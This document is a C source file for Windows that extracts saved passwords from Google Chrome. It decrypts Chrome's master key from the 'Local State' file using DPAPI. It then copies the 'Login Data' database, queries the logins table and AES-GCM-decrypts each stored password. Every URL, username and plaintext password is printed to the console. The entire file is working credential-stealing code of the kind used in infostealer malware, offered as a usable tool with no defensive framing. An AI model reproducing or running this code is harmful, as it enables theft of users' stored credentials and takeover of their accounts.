#include <stdio.h>
#include <windows.h>
#include <cassert>
#include <sqlite3/sqlite3.h>
#include <cJSON/cJSON.h>
#include <base64/base64.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>

static long FileSize(FILE* f)
{
	fseek(f, 0L, SEEK_END);
	long res = ftell(f);
	rewind(f);
	return res;
}

static LPSTR GetFullPathFromRelativeToChrome(LPCSTR relative)
{
	LPSTR pathToLocal;
	size_t pathToLocalLength; // Contains null terminator.
	if (_dupenv_s(&pathToLocal, &pathToLocalLength, "LOCALAPPDATA") || !pathToLocal)
	{
		printf("Failed to read \"LOCALAPPDATA\" env variable.\n");
		exit(1);
	}

	const LPCSTR chromeDir = "\\Google\\Chrome\\";

	size_t resultLength = pathToLocalLength + strlen(chromeDir) + strlen(relative);
	LPSTR result = malloc(resultLength);
	if (!result)
	{
		printf("Failed to allocate.\n");
		exit(1);
	}

	strcpy_s(result, resultLength, pathToLocal);
	strcat_s(result, resultLength, chromeDir);
	strcat_s(result, resultLength, relative);

	free(pathToLocal);
	return result;
}

static LPCSTR ParseEncryptedKey(LPSTR* buf)
{
	FILE* jsonFile;
	LPSTR localStatePath = GetFullPathFromRelativeToChrome("User Data\\Local State");
	fopen_s(&jsonFile, localStatePath, "rt");
	free(localStatePath);
	if (!jsonFile)
		return "Failed to open \"Local State\" json file.";

	size_t fileSize = FileSize(jsonFile);
	char* fileContent = (char*)malloc(fileSize);
	if (!fileContent)
		return "Failed to allocate memory for file content";
	fread_s(fileContent, fileSize, fileSize, 1, jsonFile);
	fclose(jsonFile);

	cJSON* json = cJSON_Parse(fileContent);
	if (!json)
		return "Failed to parse json.";

	const cJSON* os_crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
	if (!os_crypt || !cJSON_IsObject(os_crypt))
		return "Failed to parse \"os_crypt\".";
	
	const cJSON* encrypted_key = cJSON_GetObjectItemCaseSensitive(os_crypt, "encrypted_key");
	if (!encrypted_key || !cJSON_IsString(encrypted_key))
		return "Failed to parse \"encrypted_key\".";
	
	LPCSTR encryptedKey = encrypted_key->valuestring;
	size_t encryptedKeyLength = strlen(encryptedKey);

	*buf = malloc(encryptedKeyLength + 1);
	strcpy_s(*buf, encryptedKeyLength + 1, encryptedKey);

	cJSON_Delete(json);
	free(fileContent);

	return NULL;
}

static DATA_BLOB GetMasterKey()
{
	LPSTR encryptedKeyBase64;
	LPCSTR errorStr = ParseEncryptedKey(&encryptedKeyBase64);
	if (errorStr)
	{
		printf("%s\n", errorStr);
		exit(1);
	}

	size_t encryptedKeyLength = Base64decode_len(encryptedKeyBase64);
	LPSTR encryptedKey = malloc(encryptedKeyLength);
	Base64decode(encryptedKey, encryptedKeyBase64);
	free(encryptedKeyBase64);

	// Removing "DPAPI" (5 symbols)
	DATA_BLOB dataIn = { encryptedKeyLength - 5, encryptedKey + 5 };
	DATA_BLOB dataOut;
	if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut))
	{
		printf("Unsuccessfully decrypted masterkey.\n");
		printf("ErrorCode = %u.\n", GetLastError());
		exit(1);
	}

	free(encryptedKey);

	return dataOut;
}

static BOOL AesGcmDecrypt(DATA_BLOB cipher, DATA_BLOB key, DATA_BLOB iv, PDATA_BLOB decrypted)
{
	EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
	if (!ctx)
		return FALSE;

	if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
		return FALSE;

	if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.cbData, NULL))
		return FALSE;

	if (!EVP_DecryptInit_ex(ctx, NULL, NULL, key.pbData, iv.pbData))
		return FALSE;

	int bufLen;
	int sumLen = 0;

	if (!EVP_DecryptUpdate(ctx, decrypted->pbData + sumLen, &bufLen, cipher.pbData + sumLen, cipher.cbData))
		return FALSE;
	sumLen += bufLen;

	int ret = EVP_DecryptFinal_ex(ctx, decrypted->pbData + sumLen, &bufLen);
	sumLen += bufLen;

	EVP_CIPHER_CTX_free(ctx);

	decrypted->cbData = sumLen;

	//return ret > 0;
	return TRUE;
}

static int DecryptPassword(const DATA_BLOB encryptedPassword, const DATA_BLOB masterKey, PDATA_BLOB decryptedPassword)
{
	const DATA_BLOB iv = { 15 - 3, encryptedPassword.pbData + 3 };
	const DATA_BLOB payload = { encryptedPassword.cbData - 15, encryptedPassword.pbData + 15 };

	int ret = AesGcmDecrypt(payload, masterKey, iv, decryptedPassword);
	decryptedPassword->cbData -= 16;
	decryptedPassword->pbData[decryptedPassword->cbData] = '\0';
	return ret;
}

int main(int argc, char** argv)
{
	const DATA_BLOB masterKey = GetMasterKey();

	LPSTR loginDataPath = GetFullPathFromRelativeToChrome("User Data\\default\\Login Data");
	LPCSTR loginDataTemporaryCopyPath = "Login Data.tmp";
	if (!CopyFile(loginDataPath, loginDataTemporaryCopyPath, TRUE))
	{
		printf("Failed to create a temporary copy of \"Login Data\".");
		exit(1);
	}
	free(loginDataPath);

	sqlite3* connection;
	if (sqlite3_open(loginDataTemporaryCopyPath, &connection) != SQLITE_OK)
	{
		printf("sqlite3_open error.\n");
		exit(1);
	}

 	LPCSTR query = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt* result;
	if (sqlite3_prepare_v2(connection, query, -1, &result, 0) != SQLITE_OK)
	{
		printf("sqlite3_prepare_v2 error.\n");
		exit(1);
	}

	while (sqlite3_step(result) != SQLITE_DONE)
	{
		printf("URL: %s\n", sqlite3_column_text(result, 0));
		printf("Login: %s\n", sqlite3_column_text(result, 1));

		const DATA_BLOB encryptedPassword = { sqlite3_column_bytes(result, 2), (BYTE*)sqlite3_column_blob(result, 2) };
		BYTE decryptedPasswordBuf[512];
		DATA_BLOB decryptedPassword = { 0, decryptedPasswordBuf };
		if (DecryptPassword(encryptedPassword, masterKey, &decryptedPassword))
		{
			printf("Password: %s\n", decryptedPassword.pbData);
		}
		else
		{
			printf("Failed to decrypt password.\n");
		}

		printf("\n");
	}

	sqlite3_finalize(result);
	sqlite3_close(connection);
	remove(loginDataTemporaryCopyPath);

	LocalFree(masterKey.pbData);

	return 0;
}
